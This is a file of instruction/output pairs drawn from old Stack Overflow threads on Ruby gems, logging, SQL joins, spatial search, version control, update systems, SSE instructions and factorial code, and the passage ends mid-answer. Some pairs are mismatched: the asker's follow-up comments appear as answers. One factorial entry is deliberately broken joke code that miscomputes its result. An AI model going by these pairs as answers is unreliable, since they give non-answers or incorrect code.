{"instruction": "I'm not sure of all of them, but what are the commands to do things like update Ruby, download a new gem, or update an existing gem? What other important things are there?\nSince it might matter, I'm running Windows.", "output": "Okay.  I see what you're going for but again try to go abstract because I know someone will give you a direct answer (which people should up-vote over this).\nEveryone should get comfortable with man pages.  But even if you are, you'll find that these commands lack decent man pages.  However, those that do will point you to cmd --help and you will find some decent documentation there.  I linked each of the commands above to a hopefully useful resource that will lead you to an answer if you're worried about command line switches.  I see someone already posted the commands so I won't repeat those for gem.  But I'd go further and say:\nsudo gem update [gemname]\n\nThe default behavior will update all installed gems.\n\nAlso, as a bonus there is a neat gem called cheat.  The idea is that instead of typing man cmd you will type cheat cmd and you can get a community editable man page for that command.  Or better yet, it doesn't have to be a command, it can be an entire topic.  Coincidentally to install cheat you would do:\nsudo gem install cheat\n\nAnd then:\ncheat gem\n\nThat will list out a \"man page\" written by users like you about the gem command.  The commands that you asked for are on that page.  Anyone can add new pages, update existing pages, and contribute to the community.  If you're interested here is a quick addition you can make to have autocompletion for the cheat command from the command line.\nI know I have long winded answers ;)"}
{"instruction": "I'm not sure of all of them, but what are the commands to do things like update Ruby, download a new gem, or update an existing gem? What other important things are there?\nSince it might matter, I'm running Windows.", "output": "Is there a similar command to update Ruby itself?\n\nAlas, no there is not.  I'm afraid that if you want to update Ruby itself you will have to either download an installer from the Ruby website, or compile it from source.\nI should mention though that compiling from source is very easy and offers developers quite a bit of neat flexibility.  You can add a suffix to the generated commands so that you can have standalone Ruby 1.8 and Ruby 1.9 builds both at the same time.  That can be very helpful for testing.\nFinally, its always a danger to update an operating systems built in commands unless it occurs through an official update.  Installed applications may be expecting to a Ruby 1.8 in the standard location and crash if they meet an updated version.  Any updates you make should just not overwrite one that came with an OS.  (If any app crashes then its the fault of the app's developers for not specifying the absolute path to the OS version)."}
{"instruction": "Is it still worth to add the log4j library to a Java 5 project just to log\nlet's say some exceptions to a file with some nice rollover settings.\nOr will the standard util.logging facility do the job as well?\nWhat do you think?", "output": "Log4j has been around for a long time, and it works very well.  I have no scientific study to back it, but based on what I've seen at a large number of clients, it is easily the logging framework that I see used more than any other.  It has been around for a long time, and not been replaced by the Next Big Logging Framework, which says something.  \nIt is dead simple to set up, and easy to learn the basic appenders (outputs).  There are a whole host appenders that are available, including:\n\nConsoleAppender\nDailyRollingFileAppender\nExternallyRolledFileAppender \nFileAppender\nJDBCAppender\nJMSAppender\nNTEventLogAppender\nRollingFileAppender\nSMTPAppender\nSocketAppender\nSyslogAppender\nTelnetAppender\nWriterAppender\n\nPlus others.  It isn't difficult to write your own appender either.  Additionally there is a great deal of flexibility in each of the appenders that allow you to control specifically what is output in your log.\nOne note, I had a series of classloader problems when I used apache commons logging in addition to log4j.  It was only for one specific application, but I found it simpler to use log4j alone, rather than to have the flexibility offered when using an abstraction layer like commons logging.    \nSee this article for\nmore details:\nGood luck!"}
{"instruction": "I've seen projects where the classes in the DB layer have just static functions in them and other projects where those classes need to be instantiated to get access to the member functions. \nWhich is \"better\" and why?", "output": "Another \"it depends\".  However, I can also think of a very common scenario where static just won't work.  If you have a web site that gets a decent amount of traffic, and you have a static database layer with a shared connection, you could be in trouble.  In ASP.Net, there is one instance of your application created by default, and so if you have a static database layer you may only get one connection to the database for everyone who uses your web site."}
{"instruction": "I'm writing an interpreter for an experimental language. Three of the main constructs of the language are definitions, statements, and expressions. Definitions can contain statements and expressions, statements can contain definitions and expressions, and one kind of expression can contain statements. I represent all of these using union types so I can easily use pattern matching on them. Ideally, I would like to put the code for these in different files, but OMake complains about circular dependency issues. As far as I know, circular type definitions across modules are not allowed.\nThe only way I know of to solve this is to define all three types at once:\ntype defn = ...\nand stmt = ...\nand expr = ...\n\nIt seems like this requires all the code for types to be in the same file. Is there any way around this? How do you deal with circular definitions in your code?", "output": "Recursive definitions need to appear in the same file. If you want to separate definitions, statements, and expressions into separate modules, you can do so using recursive modules, but they will still need to appear in the same file. DAG-ifying inter-file dependencies is one of the annoyances of OCaml."}
{"instruction": "We're working on an application that displays information through a Direct3D visualisation. A late client request is the ability to view this application via some Remote Desktop solution.\nHas anyone done anything similar? What options are available / unavailable? I'm thinking RDC, VNC, Citrix...\nAny advice?", "output": "I think you can still use all of the normal D3D tools, but you won't be able to render to a surface associated with the screen. You'll have to render to a DIB (or some such) and Blt it with GDI to a normal window HDC. RDC/VNC/Citrix should all work with this technique.\nPerformance will definitely suffer - but that's going to be the case over remote desktop anyway. In fact, if I were you, I would mock up a VERY simple prototype and demonstrate the performance before committing to it. \nGood luck!"}
{"instruction": "I am looking for a Web Framework to move windows based applications to the web.\nThe main requirements to WF are the following:\n\nunit tests support\ndesktop and mobile browsers support\nlong term viability\nmaturity of the framework", "output": "Honestly if you want an MVC framework for asp.net I would pick Castle Monorail. I think it is more mature then the current MVC framework from microsoft."}
{"instruction": "Does anyone know how IE7 determines what Security Zone to use for a site?  I see the basics for IE6 here, but I can't find the equivalent for IE7.", "output": "I could use a little more information to narrow down my answer, but here is what I have:\nInternet Explorer has 5 different security zones be default: Local Machine Zone, Intranet, Internet, Trusted, and Restricted\nThese are determined in urlmon.dll (Url Moniker)\nMore information here: http://msdn.microsoft.com/en-us/library/ms537183(VS.85).aspx\nBut you can also implement your own custom security zone:\nhttp://msdn.microsoft.com/en-us/library/ms537182(VS.85).aspx\nThe way that IE determines the security zones should not have changes between IE6 and IE7 (or IE8 for that matter)\nIntranet sites are determined:\n1. By url host names do not have any dots (http://stackoverflow vs http://stackoverflow.com)\n\nSites from the file:// scheme where the resource is collected from UNC"}
{"instruction": "Is it \"acceptable\" to have an ASP.Net 2.0 application without the BLL (Business Logic Layer) as the following?\n\nSQL Server Data Storage & Stored Procedures\nData Link Layer (Strongly Typed Table Adapters) connecting to Stored Procs\nPresentation Layer ASPX Pages with Code behind and ObjectDataSource for connection straight to the DLL\n\nIs a BLL always preferable, even if business logic is entirely validatable in the presentation's code behind?  What are the potential drawbacks for not using a BLL?", "output": "It depends. If your business logic is in your click events and page loads, it is NOT acceptable.\nIt appears that your business logic is somewhere within the DAL (e.g., stored procedures and such), just as long as you are consistent, it's fine. As long as you are very, very sure that your clients will always be using SQL Server then this approach is not a problem.\nI know a colleague who has all his business logic in stored procedures that his views are mostly thin clients to database backends: he has been immensely successful with the product that he sells. But that's only because he's very consistent with it."}
{"instruction": "I have a list of more than 15 thousand latitude and longitude coordinates.  Given any X,Y coordinates, what is the fastest way to find the closest coordinates on the list?", "output": "Thanks everyone for the answers.\n@Tom, @Chris Upchurch:  The coordinates are fairly close to each others, and they are in a relatively small area of about 800 sq km.  I guess I can assume the surface to be flat.  I need to process the requests over and over again, and the response should be faster enough for more web experience."}
{"instruction": "In one of the answers to Broadcast like UDP with the Reliability of TCP, a user mentions the Spread messaging API.  I've also run across one called \u00d8MQ.  I also have some familiarity with MPI.  \nSo, my main question is: why would I choose one over the other?  More specifically, why would I choose to use Spread or \u00d8MQ when there are mature implementations of MPI to be had?", "output": "I have not used any of these libraries, but I may be able to give some hints.\n\nMPI is a communication protocol while Spread and \u00d8MQ are actual implementation.\nMPI comes from \"parallel\" programming while Spread comes from \"distributed\" programming.\n\nSo, it really depends on whether you are trying to build a parallel system or distributed system. They are related to each other, but the implied connotations/goals are different. Parallel programming deals with increasing computational power by using multiple computers simultaneously. Distributed programming deals with reliable (consistent, fault-tolerant and highly available) group of computers.\nThe concept of \"reliability\" is slightly different from that of TCP. TCP's reliability is \"give this packet to the end program no matter what.\" The distributed programming's reliability is \"even if some machines die, the system as a whole continues to work in consistent manner.\" To really guarantee that all participants got the message, one would need something like 2 phase commit or one of faster alternatives."}
{"instruction": "In one of my applications, I am querying active directory to get a list of all users below a given user (using the \"Direct Reports\" thing). So basically, given the name of the person, it is looked up in AD, then the Direct Reports are read. But then for every direct report, the tool needs to check the direct reports of the direct reports. Or, more abstract: The Tool will use a person as the root of the tree and then walk down the complete tree to get the names of all the leaves (can be several hundred)\nNow, my concern is obviously performance, as this needs to be done quite a few times. My idea is to manually cache that (essentially just put all the names in a long string and store that somewhere and update it once a day).\nBut I just wonder if there is a more elegant way to first get the information and then cache it, possibly using something in the System.DirectoryServices Namespace?", "output": "AD does that sort of caching for you so don't worry about it unless performance becomes a problem.  I have software doing this sort of thing all day long running on a corporate intranet that takes thousands of hits per hour and have never had to tune performance in this area."}
{"instruction": "I have three tables: page, attachment, page-attachment\nI have data like this:\npage\nID    NAME\n1     first page\n2     second page\n3     third page\n4     fourth page\n\nattachment\nID    NAME\n1     foo.word\n2     test.xsl\n3     mm.ppt\n\npage-attachment\nID    PAGE-ID   ATTACHMENT-ID\n1     2         1\n2     2         2\n3     3         3\n\nI would like to get the number of attachments per page also when that number is 0. I have tried with: \nselect page.name, count(page-attachment.id) as attachmentsnumber \nfrom page \n    inner join page-attachment on page.id=page-id \ngroup by page.id\n\nI am getting this output: \nNAME        ATTACHMENTSNUMBER\nsecond page  2\nthird page   1\n\nI would like to get this output:\nNAME        ATTACHMENTSNUMBER\nfirst page   0\nsecond page  2\nthird page   1\nfourth page  0\n\nHow do I get the 0 part?", "output": "Change your \"inner join\" to a \"left outer join\", which means \"get me all the rows on the left of the join, even if there isn't a matching row on the right.\"\nselect page.name, count(page-attachment.id) as attachmentsnumber \nfrom page \n    left outer join page-attachment on page.id=page-id \ngroup by page.name"}
{"instruction": "I have three tables: page, attachment, page-attachment\nI have data like this:\npage\nID    NAME\n1     first page\n2     second page\n3     third page\n4     fourth page\n\nattachment\nID    NAME\n1     foo.word\n2     test.xsl\n3     mm.ppt\n\npage-attachment\nID    PAGE-ID   ATTACHMENT-ID\n1     2         1\n2     2         2\n3     3         3\n\nI would like to get the number of attachments per page also when that number is 0. I have tried with: \nselect page.name, count(page-attachment.id) as attachmentsnumber \nfrom page \n    inner join page-attachment on page.id=page-id \ngroup by page.id\n\nI am getting this output: \nNAME        ATTACHMENTSNUMBER\nsecond page  2\nthird page   1\n\nI would like to get this output:\nNAME        ATTACHMENTSNUMBER\nfirst page   0\nsecond page  2\nthird page   1\nfourth page  0\n\nHow do I get the 0 part?", "output": "You want a left join, instead of an inner join, as that allows records to not exist."}
{"instruction": "I have three tables: page, attachment, page-attachment\nI have data like this:\npage\nID    NAME\n1     first page\n2     second page\n3     third page\n4     fourth page\n\nattachment\nID    NAME\n1     foo.word\n2     test.xsl\n3     mm.ppt\n\npage-attachment\nID    PAGE-ID   ATTACHMENT-ID\n1     2         1\n2     2         2\n3     3         3\n\nI would like to get the number of attachments per page also when that number is 0. I have tried with: \nselect page.name, count(page-attachment.id) as attachmentsnumber \nfrom page \n    inner join page-attachment on page.id=page-id \ngroup by page.id\n\nI am getting this output: \nNAME        ATTACHMENTSNUMBER\nsecond page  2\nthird page   1\n\nI would like to get this output:\nNAME        ATTACHMENTSNUMBER\nfirst page   0\nsecond page  2\nthird page   1\nfourth page  0\n\nHow do I get the 0 part?", "output": "LEFT join is your friend.\nTo learn more about different join types refer to http://en.wikipedia.org/wiki/Join_(SQL)"}
{"instruction": "I have a list of more than 15 thousand latitude and longitude coordinates.  Given any X,Y coordinates, what is the fastest way to find the closest coordinates on the list?", "output": "Based on your clarifications, I would use a geometrical data structure such as a KD-tree or an R-tree. MySQL has a SPATIAL data type which does this. Other languages/frameworks/databases have libraries to support this. Basically, such a data structure embeds the points in a tree of rectangles, and searches the tree using a radius. This should be fast enough, and I believe is simpler than building a Voronoi diagram. I guess there is some threshold above which you would prefer the added performance of a Voronoi diagram so you will be ready to pay the added complexity."}
{"instruction": "We're working on an application that displays information through a Direct3D visualisation. A late client request is the ability to view this application via some Remote Desktop solution.\nHas anyone done anything similar? What options are available / unavailable? I'm thinking RDC, VNC, Citrix...\nAny advice?", "output": "The build-in remote desktop works. (You don't have to do anything special)\nBut it is extremely slow, because when in doubt, it just sends the contents of a window as a bitmap."}
{"instruction": "Is there a recommendation for a hardware platform for developing/testing SideShow devices, or is the Emulator adequate?", "output": "I'm not really sure about sideshow in particular. But since sideshow uses the microframework I could give you my view on that.\nFor just getting started the emulator is very good. You're going to use the emulator during development most of the time anyway so if you're just figuring things out it is fine to use just that. You can also tweak the emulator to emulate the specific hardware you want to use (add io ports etc.) so if you're not clear on what you want to do or what you need this is a good way to try stuff out.\nIf you know exactly what you want to build it might be a good idea to think about what hardware you're going to need as soon as possible. There are some developer boards out there for the microframework that you might use for sideshow. Or if you've got specific needs you might end up developing your own hardware and porting the microframework to it. I don't really know what you need so I can't recommend a specific hardware platform. There are some examples on the microsoft microframework site that you might want to look at. http://msdn.microsoft.com/en-us/embedded/bb267253.aspx look under the heading developer kits.\nI hope this is usefull for you."}
{"instruction": "How would people recommend doing version control for word documents? Is the in build control up to the job or is it better to rely on dedicated version control systems, and if so, which ones?", "output": "You could use something like subversion, but it is going to upload a whole new copy of the document, instead of a changeset.\nSharepoint has some versioning for office documents, but I haven't tried it yet (or checked what it is storing)."}
{"instruction": "Graphics and audio editing and processing software often contain functions called \"High-Pass Filter\" and \"Low-Pass Filter\".  Exactly what do these do, and what are the algorithms for implementing them?", "output": "High-pass filter lets high-frequency (detailed/local information) pass.\nLow-pass filter lets low-frequency (coarse/rough/global information) pass."}
{"instruction": "How would people recommend doing version control for word documents? Is the in build control up to the job or is it better to rely on dedicated version control systems, and if so, which ones?", "output": "Subversion has built in support for word documents so it's a pretty decent solution, but you might want to look into a proper document repository like the one built into sharepoint 07. The advantage is that it allows proper access control, versioning and rollback as well as being able to link to it from websites.\nIf you want to do serious versioning then no, I don't think the inbuilt controls will be up to the task, particularly if you want to share the documents with others."}
{"instruction": "How would people recommend doing version control for word documents? Is the in build control up to the job or is it better to rely on dedicated version control systems, and if so, which ones?", "output": "@lomaxx:\n\nSubversion has built in support for word documents \n\nMore specifically, TortoiseSVN does. If you use the TortoiseSVN context menu in explorer to, e.g., bring up a diff, Tortoise will call a script that uses Word's built-in comparison feature to do the actual diff'ing."}
{"instruction": "How would people recommend doing version control for word documents? Is the in build control up to the job or is it better to rely on dedicated version control systems, and if so, which ones?", "output": "You could use something like subversion, but it is going to upload a whole new copy of the document, instead of a changeset.\n\nI was under the impression SVN stored byte-level diffs, which makes it possible for it to store incremental changes to binary files such as Word docs and pictures, as well as text files.  How to meaningfully represent those changes in a diff is another question, but underneath the hood I think SVN stores changesets for binaries."}
{"instruction": "I'd like to add a method to my existing server's CORBA interface. Will that require recompiling all clients?\nI'm using TAO.", "output": "Operations (methods) are looked-up by name, so you only need to recompile the clients that use the new operation."}
{"instruction": "I'm a bit newbieish when it comes to the deeper parts of OSX configuration and am having to put up with a fairly irritating niggle which while I can put up with it, I know under Windows I could have sorted in minutes.\nBasically, I have an external disk with two volumes: \nOne is an HFS+ volume which I use for TimeMachine backups.\nThe other, an NTFS volume that I use for general file copying etc on Mac and Windows boxes.\nSo what happens is that whenever I plug in the disk into my Mac USB, OSX goes off and mounts both volumes and shows an icon on the desktop for each. The thing is that to remove the disk you have to eject the volume and in this case do it for both volumes, which causes an annoying warning dialog to be shown every time. \nWhat I'd prefer is some way to prevent the NTFS volume from auto-mounting altogether. I've done some hefty googling and here's a list of things I've tried so far:\n\nI've tried going through options in Disk Utility\nI've tried setting AutoMount to No in /etc/hostconfig but that is a bit too global for my liking.\nI've also tried the suggested approach to putting settings in fstab but it appears the OSX (10.5) is ignoring these settings.\n\nAny other suggestions would be welcomed. Just a little dissapointed that I can't just tick a box somewhere (or untick).\nEDIT: Thanks heaps to hop for the answer it worked a treat. For the record it turns out that it wasn't OSX not picking up the settings I actually had \"msdos\" instead of \"ntfs\" in the fs type column.", "output": "The following entry in /etc/fstab will do what you want, even on 10.5 (Leopard):\nLABEL=VolumeName  none    ntfs    noauto\n\nIf the file is not already there, just create it. Do not use /etc/fstab.hd! No reloading of diskarbitrationd needed.\nIf this still doesn't work for you, maybe you can find a hint in the syslog."}
{"instruction": "I am ready to start using SVN, but I have NO (as in the money required for free beer) experience with source control.  I have installed subversion on my server (that was easy, 'apt-get install subversion') but now I don't know what to do, how to configure it, or how to use it.What suggestions do you have, and where can I find good resources to learn to start using it?\nUpdate:\nO.K. So the feedback has been great and I have read through a bit of it but I want to clarify my question by saying that I am looking for more information on how to actually go about setting my up my repositories, clients, server, etc.  I know that I could do a quick Google search and find dozens (or more) resources but I'm hoping that someone whom has experience with subversion and a client(I have installed tortoise) could suggest a good reference that will be reliable, and have quality content.", "output": "Jeff posted a good \"getting started\" article for Windows, including how to setup svnserve:\nSetting up Subversion on Windows"}
{"instruction": "Has anyone used Mono, the open source .NET implementation on a large or medium sized project? I'm wondering if it's ready for real world, production environments. Is it stable, fast, compatible, ... enough to use? Does it take a lot of effort to port projects to the Mono runtime, or is it really, really compatible enough to just take of and run already written code for Microsoft's runtime?", "output": "The recommendations for the accepted answer are a little out of date now.\n\nThe windows forms implementation is pretty good now.  (See Paint-Mono for a port of Paint.net which is a pretty involved Windows forms application.  All that was required was an emulation layer for some of the P-Invoke and unsupported system calls).\nPath.Combine as well as Path.Seperator to join paths and filenames.\nThe windows Registry is OK, as long as you are only using it for storing and retrieving data from your applications (i.e. you can't get any information about Windows from it, since it is basically a registry for Mono applications)."}
{"instruction": "I want to implement an \"automatic update\" system for  a windows application. \nRight now I'm semi-manually creating an \"appcast\" which my program checks, and notifies the user that a new version is available. (I'm using\n NSIS for my installers).\nIs there software that I can use that will handle the \"automatic\" part of the updates, perhaps similar to  Sparkle on the mac? Any issues/pitfalls that I should be aware of?", "output": "If your application is written in .Net, you could try ClickOnce.  However, it's difficult to perform administrative or custom actions during install using this approach."}
{"instruction": "I want to implement an \"automatic update\" system for  a windows application. \nRight now I'm semi-manually creating an \"appcast\" which my program checks, and notifies the user that a new version is available. (I'm using\n NSIS for my installers).\nIs there software that I can use that will handle the \"automatic\" part of the updates, perhaps similar to  Sparkle on the mac? Any issues/pitfalls that I should be aware of?", "output": "For .NET, a while back Microsoft Patterns + Practices published the Application Updater Block. This was (to my mind) rather overblown and over-engineered, but did the job quite well.\nIn essence it used a \"stub loader\" to check a manifest and a Web service to see if a later version of the program than the one installed was available, then used the BITS background downloader technology to download a new version if one was available on the server.\nOnce the new version was downloaded and installed (with .NET this is as simple as an xcopy to the relevant folder), the application would update the manifest. The next time the program was loaded the new version would be launched.\nWhile the Patterns + Practices code is .NET specific, there's nothing there that couldn't be copied for a non-.NET application, especially if you have the ability to silently run the install process in the background."}
{"instruction": "I want to implement an \"automatic update\" system for  a windows application. \nRight now I'm semi-manually creating an \"appcast\" which my program checks, and notifies the user that a new version is available. (I'm using\n NSIS for my installers).\nIs there software that I can use that will handle the \"automatic\" part of the updates, perhaps similar to  Sparkle on the mac? Any issues/pitfalls that I should be aware of?", "output": "There is no solution quite as smooth as Sparkle (that I know of).\nIf you need an easy means of deployment and updating applications, ClickOnce is an option. Unfortunately, it's inflexible (e.g., no per-machine installation instead of per-user), opaque (you have very little influence and clarity and control over how its deployment actually works) and non-standard (the paths it stores the installed app in are unlike anything else on Windows).\nMuch closer to what you're asking would be ClickThrough, a side project of WiX, but I'm not sure it's still in development (if it is, they should be clearer about that\u2026) \u2014 and it would use MSI in any case, not NSIS.\nYou're likely best off rolling something on your own. I'd love to see a Sparkle-like project for Windows, but nobody seems to have given it a shot thus far."}
{"instruction": "This is a somewhat low-level question.  In x86 assembly there are two SSE instructions: \n\nMOVDQA xmmi, m128\n\nand  \n\nMOVNTDQA xmmi, m128\n\nThe IA-32 Software Developer's Manual says that the NT in MOVNTDQA stands for Non-Temporal, and that otherwise it's the same as MOVDQA.\nMy question is, what does Non-Temporal mean?", "output": "Non-Temporal SSE instructions (MOVNTI, MOVNTQ, etc.), don't follow the normal cache-coherency rules. Therefore non-temporal stores must be followed by an SFENCE instruction in order for their results to be seen by other processors in a timely fashion.\nWhen data is produced and not (immediately) consumed again, the fact that memory store operations read a full cache line first and then modify the cached data is detrimental to performance. This operation pushes data out of the caches which might be needed again in favor of data which will not be used soon. This is especially true for large data structures, like matrices, which are filled and then used later. Before the last element of the matrix is filled the sheer size evicts the first elements, making caching of the writes ineffective.\nFor this and similar situations, processors provide support for non-temporal write operations. Non-temporal in this context means the data will not be reused soon, so there is no reason to cache it. These non-temporal write operations do not read a cache line and then modify it; instead, the new content is directly written to memory. \nSource: http://lwn.net/Articles/255364/"}
{"instruction": "Are there any useful techniques for reducing the repetition of constants in a CSS file?\n(For example, a bunch of different selectors which should all apply the same colour, or the same font size)?", "output": "Personally, I just use comma-separed selector, but there some solution for writing css programmatically. Maybe this is a little overkill for you simpler needs, but take a look at CleverCSS (Python)"}
{"instruction": "Are there any useful techniques for reducing the repetition of constants in a CSS file?\n(For example, a bunch of different selectors which should all apply the same colour, or the same font size)?", "output": "CSS Variables, if it ever becomes implemented in all major browsers, may one day resolve this issue.\nUntil then, you'll either have to copy and paste, or use a preprocessor of whatever sort, like others have suggested (typically using server-sider scripting)."}
{"instruction": "I'm currently learning F# quite intensively. I really love it as a language, it just sort of 'feels' right and seems to allow you to produce some succint elegant code.\nI'm interested in finding some really nice 'wow factor' snippets of F# code which demonstate the elegence of the language, especially compared to C#. For example I really like:-\n\n#light\nlet ListProduct l = List.fold_left (*) 1 l\n\nWhich inputs a list of ints and multiplies each element in the list, i.e. obtains the product of the list (e.g. a list of 1,2,3 would be calculated as 1*2*3=6). The closest C# equivilent, using LINQ and functional concepts is as follows:-\nusing System;\nusing System.Collections.Generic;\nusing System.Linq;\n\n...\n\npublic static class ListHelper {\n  public static int ListProduct(List<int> l) {\n    return l.Aggregate(1, (i, j) => i * j);\n  }\n}    \n\nBefore LINQ that would have been:-\nusing System;\nusing System.Collections.Generic;\n\n...\n\npublic static class ListHelper {\n  public static int ListProduct(List<int> l) {\n    int ret = 1;\n    foreach (int i in l) ret *= i;\n    return ret;\n  }\n}\n\nI'm certainly not trying to criticise C# here, I think it's a wonderful language, it's just nice to see how F# compares and to see how it can do some things more elegantly - does anyone have anything really nice?", "output": "My favorite is recursively listing all files under a folder in a four-line sequence expression:\nopen System.IO\n\nlet rec filesUnderFolder basePath =\n    seq {\n        for file in Directory.GetFiles(basePath) do\n            yield file\n        for subDir in Directory.GetDirectories(basePath) do\n            yield! filesUnderFolder subDir\n        }"}
{"instruction": "I am looking for open source or free data collaboration software. Specifically this is for a non-profit organization that wants to teach remote students how a foreign language.  The idea is that an instructor would teach a class and there would be up to 10 students in the class at a time.  The instructor would be able to post slides or other teaching material and the students would be able to see it on their computers remotely.  Video is not required but audio is a must.  Any recommendations?\nAlso if there have been any reviews or feature comparison amongst these products, I would be interested in hearing about them.", "output": "I have used DimDim a few times as part of an educational project.\nYou can use it as part of a hosted service from DimDim themselves, and also has an open source version that you can download and run yourself.\nI have not used it in the last six months or so, but we did find it very useful for collaborating in a multimedia-style classroom, but like all media streaming, does require a decent broadband connection both on the server and client end.\nOne further issue we discovered with it was that to avoid a lot of messy firewall issues (especially at educational institutions) you need to run it on its own machine on port 80, so if it is running in collaboration with another website (such as Moodle), you need a separate machine for DimDim and for Moodle.\nSo far, to avoid a lot of technical issues that existed a year ago (but have probably been resolved), the project I was working on went with a hosted service at the time, but it is expected that it will end up running its own versions for control and cost reasons."}
{"instruction": "I have developed some classes with similar behavior, they all implement the same interface.  I implemented a factory that creates the appropriate object and returns the interface.  I am writing a unit test for the factory.  All you get back is an interface to the object.\nWhat is the best way to test that the factory has worked correctly?\nI would like to know the answer in Java, but if there is a solution that crosses languages I would like to know it.\nNumber 2. in the answer, would be done like the other answer?  If so I will mark the other answer accepted as well and reword my question to adress both a factory where an interface is returned and you have no clue what type of concrete class implemented the interface, and the case where you do know what concrete class was used.", "output": "Since I don't know how your factory method looks like, all I can advise right now is to \n\nCheck to see the object is the correct concrete implementation you were looking for:\nIMyInterface fromFactory = factory.create(...);  \nAssert.assertTrue(fromFactory instanceof MyInterfaceImpl1);\n\nYou can check if the factory setup the concrete instances with valid instance variables."}
{"instruction": "I have developed some classes with similar behavior, they all implement the same interface.  I implemented a factory that creates the appropriate object and returns the interface.  I am writing a unit test for the factory.  All you get back is an interface to the object.\nWhat is the best way to test that the factory has worked correctly?\nI would like to know the answer in Java, but if there is a solution that crosses languages I would like to know it.\nNumber 2. in the answer, would be done like the other answer?  If so I will mark the other answer accepted as well and reword my question to adress both a factory where an interface is returned and you have no clue what type of concrete class implemented the interface, and the case where you do know what concrete class was used.", "output": "if (myNewObject instanceof CorrectClass)\n{\n    /* pass test */\n}\n\nupdate:\nDon't know why this got marked down, so I'll expand it a bit...\npublic void doTest()\n{\n    MyInterface inst = MyFactory.createAppropriateObject();\n    if (! inst instanceof ExpectedConcreteClass)\n    {\n        /* FAIL */\n    }\n}"}
{"instruction": "What are good libraries for C with datastructures like vectors, deques, stacks, hashmaps, treemaps, sets, etc.? Plain C, please, and platform-independent.", "output": "There's some stuff in the Apache Portable Runtime (APR) that I'd expect to be very solid."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "F#: Functional\nStraight forward:\nlet rec fact x = \n    if   x < 0 then failwith \"Invalid value.\"\n    elif x = 0 then 1\n    else x * fact (x - 1)\n\nGetting fancy:\nlet fact x = [1 .. x] |> List.fold_left ( * ) 1"}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Haskell: Functional\n fact 0 = 1\n fact n = n * fact (n-1)"}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "C++: Template Metaprogramming\nUses the classic enum hack.\ntemplate<unsigned int n>\nstruct factorial {\n    enum { result = n * factorial<n - 1>::result };\n};\n\ntemplate<>\nstruct factorial<0> {\n    enum { result = 1 };\n};\n\nUsage.\nconst unsigned int x = factorial<4>::result;\n\nFactorial is calculated completely at compile time based on the template parameter n. Therefore, factorial<4>::result is a constant once the compiler has done its work."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "This one not only calculates n!, it is also O(n!). It may have problems if you want to calculate anything \"big\" though.\nlong f(long n)\n{\n    long r=1;\n    for (long i=1; i<n; i++)\n        r=r*i;\n    return r;\n}\n\nlong factorial(long n)\n{\n    // iterative implementation should be efficient\n    long result;\n    for (long i=0; i<f(n); i++)\n        result=result+1;\n    return result;\n}"}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "x86-64 Assembly: Procedural\nYou can call this from C (only tested with GCC on linux amd64).\nAssembly was assembled with nasm.\nsection .text\n    global factorial\n; factorial in x86-64 - n is passed in via RDI register\n; takes a 64-bit unsigned integer\n; returns a 64-bit unsigned integer in RAX register\n; C declaration in GCC:\n;   extern unsigned long long 